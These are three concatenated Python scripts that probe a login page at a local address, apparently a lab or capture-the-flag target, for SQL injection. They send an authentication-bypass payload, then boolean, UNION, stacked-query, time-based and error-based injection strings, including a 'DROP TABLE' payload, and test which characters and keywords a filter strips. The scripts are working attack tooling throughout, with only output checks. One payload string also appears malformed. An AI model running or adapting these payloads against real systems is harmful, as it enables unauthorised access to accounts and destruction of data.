import requests
import re
from urllib.parse import urlencode

base_url = "http://127.0.0.1:33001"
login_url = f"{base_url}/login.php"
private_url = f"{base_url}/private.php"

# First, get the login form to see structure
print("=== Fetching Login Form Structure ===")
resp = requests.get(login_url)
print(f"Status: {resp.status_code}")
print(f"Response length: {len(resp.text)}B")
print(f"\nFull HTML:")
print(resp.text)

# Extract form fields
form_fields = re.findall(r'name=["\']([^"\']+)["\']', resp.text)
print(f"\n\nForm fields found: {form_fields}")

# Check for any hidden inputs or tokens
hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', resp.text)
print(f"\nHidden inputs: {hidden_inputs}")

# Try to see if there's an error message pattern
print("\n\n=== Analyzing Failed Login Response (Difference Check) ===")
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

# Send one valid-looking request vs one with SQLi
data_valid = {'username': 'admin', 'password': 'wrongpassword123'}
data_sqli = {'username': "' OR '1'='1", 'password': 'x'}

resp_valid = requests.post(login_url, headers=headers, data=data_valid)
resp_sqli = requests.post(login_url, headers=headers, data=data_sqli)

print(f"Valid credential attempt: {resp_valid.status_code}, Length: {len(resp_valid.text)}B")
print(f"SQLi attempt:             {resp_sqli.status_code}, Length: {len(resp_sqli.text)}B")

if len(resp_valid.text) == len(resp_sqli.text):
    print("Response lengths are identical - may be same error page")
    # Check if they are actually the same content
    if resp_valid.text == resp_sqli.text:
        print("Responses are IDENTICAL")
else:
    print("Response lengths DIFFER - investigate further")
    print(f"Diff: {abs(len(resp_valid.text) - len(resp_sqli.text))} bytes")

import requests
import re

base_url = "http://127.0.0.1:33001"
login_url = f"{base_url}/login.php"

# Get full response from a failed login attempt
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
data = {'username': 'admin', 'password': 'wrongpassword'}

resp = requests.post(login_url, headers=headers, data=data)

print("=== Full POST Response ===")
print(resp.text)

print("\n=== Checking for Error Messages ===")
content_lower = resp.text.lower()
error_keywords = ['invalid', 'error', 'wrong', 'incorrect', 'failed', 'denied', 'unsuccessful', 'not found']
for keyword in error_keywords:
    if keyword in content_lower:
        print(f"Found keyword: '{keyword}'")
        # Show context
        idx = content_lower.find(keyword)
        context = resp.text[max(0, idx-30):min(len(resp.text), idx+50)]
        print(f"  Context: ...{context}...")

# Let's also check if there's a different page for correct login
# Maybe the SQLi isn't working because of filtering
print("\n=== Testing Additional SQLi Techniques ===")

tests = [
    ("boolean_based_1", {'username': "admin' AND 1=1--", 'password': 'x'}),
    ("boolean_based_2", {'username': "admin' AND 1=2--", 'password': 'x'}),
    ("union_select", {'username': "admin' UNION SELECT 1,2,3--", 'password': 'x'}),
    ("stacked_query", {'username': "admin'; SELECT * FROM users--", 'password': 'x'}),
    ("time_based", {'username': "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 'password': 'x'}),
    ("error_based", {'username': "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", 'password': 'x'}),
]

for name, test_data in tests:
    resp = requests.post(login_url, headers=headers, data=test_data)
    print(f"{name}: Status={resp.status_code}, Length={len(resp.text)}B")

# Check if there's a PHPSESSID cookie set
print("\n=== Checking for Session Cookies ===")
resp = requests.post(login_url, headers=headers, data={'username': 'admin', 'password': 'admin'})
print(f"Cookies returned: {dict(resp.cookies)}")

# Try time-based delay more explicitly
print("\n=== Testing Time-Based SQLi with Explicit Timing ===")
import time

test_queries = [
    ("normal", {'username': 'admin', 'password': 'admin'}),
    ("5sec_delay", {'username': "admin' AND (SELECT CASE WHEN (1=1) THEN (SELECT SLEEP(5)) ELSE 0 END)--", 'password': 'x'}),
]

for name, query in test_queries:
    start = time.time()
    resp = requests.post(login_url, headers=headers, data=query)
    elapsed = time.time() - start
    print(f"{name}: Elapsed time = {elapsed:.2f}s")

import requests
import re

base_url = "http://127.0.0.1:33001"
login_url = f"{base_url}/login.php"
private_url = f"{base_url}/private.php"

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

print("=== Testing Error-Based SQLi (Detailed Error Messages) ===")

# Try payloads that might trigger database error messages
error_payloads = [
    # MySQL syntax errors
    ("mysql_error_1", "admin'", 'x'),
    ("mysql_error_2", 'admin"', 'x'),
    ("mysql_error_3", "admin');", 'x'),
    ("mysql_error_4", "admin'))", 'x'),
    ("mysql_error_5", '1\\'), 'x'),
    
    # Multi-statement
    ("multi_stmt", "admin'; DROP TABLE test;--", 'x'),
    
    # Expression syntax errors
    ("expr_error", "admin'+(SELECT * FROM nonexistent_table)+'", 'x'),
    
    # Union select with different column counts
    ("union_1", "admin' UNION SELECT 1--", 'x'),
    ("union_2", "admin' UNION SELECT 1,2--", 'x'),
    ("union_3", "admin' UNION SELECT 1,2,3--", 'x'),
    ("union_4", "admin' UNION SELECT 1,2,3,4--", 'x'),
    ("union_5", "admin' UNION SELECT NULL--", 'x'),
    
    # Different comment styles
    ("comment_hash", "admin' OR '1'='1'#", 'x'),
    ("comment_hash2", "admin' OR 1=1#", 'x'),
    
    # Database specific
    ("mssql", "admin'; WAITFOR DELAY '0:0:5';--", 'x'),
    ("pgsql", "admin'; SELECT pg_sleep(5);--", 'x'),
    
    # If application uses parameterized queries but with specific patterns
    ("array_syntax", "admin[]", 'x'),
    ("json_syntax", 'admin":"test"}', 'x'),
]

for name, username, password in error_payloads:
    data = {'username': username, 'password': password}
    resp = requests.post(login_url, headers=headers, data=data)
    content = resp.text
    
    # Check if it's different from the normal "Incorrect username/password"
    if "Incorrect username/password" not in content:
        print(f"\n[!] {name}: DIFFERENT RESPONSE!")
        print(f"  Payload: {username}")
        print(f"  Status: {resp.status_code}")
        print(f"  Length: {len(content)}B")
        print(f"  Content (first 1000 chars): {content[:1000]}")
    else:
        print(f"{name}: Same error message ({len(content)}B)")

print("\n=== Checking for WAF/Filter Blocking ===")

# Check if certain characters are being stripped/filtered
def test_filter_char(char, description):
    username = f"admin{char}test"
    data = {'username': username, 'password': 'x'}
    resp = requests.post(login_url, headers=headers, data=data)
    
    # If the character was stripped, we might get "admintest" instead of "admin{char}test"
    if char in resp.text:
        return f"{description}: Character NOT filtered (found in response)"
    elif "admintest" in resp.text.lower():
        return f"{description}: Character FILTERED/Stripped"
    else:
        return f"{description}: Unknown"

filter_chars = [
    ("'", "single_quote"),
    ('"', "double_quote"),
    ("(", "left_paren"),
    (")", "right_paren"),
    ("-", "dash"),
    (";", "semicolon"),
    ("#", "hash"),
    ("/*", "comment_start"),
    ("*/", "comment_end"),
    ("=", "equals"),
    ("OR", "OR_keyword"),
    ("AND", "AND_keyword"),
    ("SELECT", "SELECT_keyword"),
    ("UNION", "UNION_keyword"),
]

print("\nFilter tests:")
for char, desc in filter_chars:
    result = test_filter_char(char, desc)
    print(f"  {result}")

